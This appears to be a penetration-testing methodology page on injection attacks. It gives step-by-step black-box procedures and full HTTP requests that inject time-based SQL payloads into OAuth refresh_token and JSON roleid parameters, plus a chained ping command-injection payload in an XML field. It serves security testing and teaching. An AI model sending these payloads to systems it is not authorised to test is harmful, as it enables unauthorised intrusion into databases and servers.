# Injection Attack

## Check List

## Methodology

### Black Box

#### [Refresh Token Parameter](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-time-based)

{% stepper %}
{% step %}
Log in to the site and complete the authentication process
{% endstep %}

{% step %}
Intercept requests while completing the authentication process using Burp Suite
{% endstep %}

{% step %}
During the authentication completion process, if the site uses the OAuth mechanism, check the requests to see if you see a parameter called `refresh_token`
{% endstep %}

{% step %}
And if the site uses REST APIs for authentication and sends data in JSON format, look for the refresh\_token parameter
{% endstep %}

{% step %}
Test SQL injection payloads by finding this parameter at the specified points to identify the vulnerability, as shown below

```http
POST /api/v1/token HTTP/1.1
Host: tsftp.example.com
User-Agent: curl/7.88.1
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Connection: close

{
  "grant_type": "refresh_token",
  "refresh_token": "'; WAITFOR DELAY '0:0:1'--"
}
```
{% endstep %}

{% step %}
Another example is the refresh\_token parameter, which is also used in Oauth

```http
POST /oauth2/token HTTP/1.1
Host: <token-server.example.com>
Content-Type: application/x-www-form-urlencoded
Accept: application/json
Connection: close

grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--&client_id=<CLIENT_ID>&client_secret=<CLIENT_SECRET>&scope=<optional_scopes>
```
{% endstep %}

{% step %}
By injecting this code into this parameter, it may give us an error in response, but we should look at the response time to see if it really takes that long
{% endstep %}
{% endstepper %}

***

#### [JSON roleid Parameter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#time-based-injection)

{% stepper %}
{% step %}
Navigate to an API endpoint that processes JSON data, such as `/api/user`, `/api/roles`, `/api/profile`, or `/api/data`, typically requiring authentication via a token
{% endstep %}

{% step %}
Perform a login request to retrieve a valid token, ensuring access to the API endpoint that uses the roleid parameter
{% endstep %}

{% step %}
Locate the roleid parameter in the JSON body of the API request, often used to filter user roles or permissions and directly passed to a database query

```json
POST /api/roles HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: [variable]
Authorization: Bearer [token]
Origin: https://example.com
Referer: https://example.com/api/roles
Connection: close

{"roleid": 1}
```
{% endstep %}

{% step %}
Modify the roleid parameter with a simple time-based payload like `1 AND SLEEP(20)` to induce a 20-second delay if the query executes

```json
POST /api/roles HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: [variable]
Authorization: Bearer [token]
Origin: https://example.com
Referer: https://example.com/api/roles
Connection: close

{"roleid": "1 AND SLEEP(20)"}
```

Use Burp Suite or curl to send the modified request and measure the response time. A \~20-second delay (21,131 ms) confirms the payload executed in the database
{% endstep %}

{% step %}
Send a non-delaying request with the original roleid value (`{"roleid": 1}`) or a neutral payload (`{"roleid": "1 AND 1=1"}`) to ensure no delay occurs, verifying the injection
{% endstep %}
{% endstepper %}

***

#### XML field

{% stepper %}
{% step %}
When you identify an XML-based API endpoint (processing user data like number, email, or mobile), test fields such as `<Number>` for Blind OS Command Injection using time-delay payloads to confirm execution without visible output. Focus on common XML processing endpoints across enterprise or government web services
{% endstep %}

{% step %}
Capture a legitimate XML request using Burp Suite when submitting personal data through the web service (profile update, form submission)
{% endstep %}

{% step %}
Locate the target field (`<Number>1234567890123</Number>`) that accepts user input and is likely passed to a backend shell command
{% endstep %}

{% step %}
Send a baseline request with normal input and record the average response time (\~56 ms)
{% endstep %}

{% step %}
Inject a cross-platform time-delay payload into the field using command chaining to force a `~10–15` second delay:

```bash
<Number>|ping -n 11 127.0.0.1||ping -c 11 127.0.0.1</Number>
```
{% endstep %}

{% step %}
Measure the response time; if it increases significantly (`~11,876 ms`), it confirms blind command execution
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
